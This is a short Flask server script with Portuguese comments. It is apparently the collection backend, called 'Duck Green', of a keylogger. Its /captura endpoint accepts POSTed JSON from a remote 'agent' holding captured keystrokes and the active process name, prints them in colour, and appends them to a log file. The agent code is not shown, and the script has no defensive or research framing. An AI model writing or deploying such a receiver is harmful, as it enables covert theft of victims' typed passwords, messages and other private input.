from flask import Flask, request
import datetime
import os

app = Flask(__name__)

# Configuração de Cores
GREEN = '\033[0;32m'
BLUE = '\033[0;34m'
YELLOW = '\033[1;33m'
RED = '\033[0;31m'
NC = '\033[0m'

# 1. Rota para a página inicial (evita o erro 404 ao abrir o link direto)
@app.route('/')
def home():
    return f"""
    <html>
        <body style="background-color:black; color:#00FF00; font-family:monospace; text-align:center; padding-top:50px;">
            <h1>🦆 DUCK GREEN STATUS: ONLINE 🦆</h1>
            <p>O receptor está à espera de dados em: <b>/captura</b></p>
        </body>
    </html>
    """

# 2. Rota de captura atualizada para aceitar GET (para teste) e POST (real)
@app.route('/captura', methods=['GET', 'POST'])
def receive():
    if request.method == 'GET':
        return "Servidor ativo! Use o agente para enviar logs (POST).", 200

    try:
        # Recebe o JSON enviado pelo agente
        data = request.json
        if not data:
            return "Nenhum dado JSON recebido", 400

        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        teclas = data.get('tecla', '')
        processo = data.get('processo', 'DESCONHECIDO')

        # Exibe no terminal
        print(f"\n{BLUE}[{timestamp}]{NC} Atividade em: {YELLOW}{processo}{NC}")
        print(f"{GREEN}>>{NC} {teclas}")
        print(f"{BLUE}{'=' * 50}{NC}")

        # Salva no ficheiro
        with open("logs_duck_green.txt", "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] [{processo}] {teclas}\n")

        return "OK", 200
    except Exception as e:
        print(f"{RED}[!] Erro ao receber dados: {e}{NC}")
        return "Erro", 500

if __name__ == '__main__':
    os.system('clear')
    print(f"{GREEN}--- DUCK GREEN - RECEPTOR ATIVO ---{NC}")
    # Inicia o servidor
    app.run(host='0.0.0.0', port=8080)
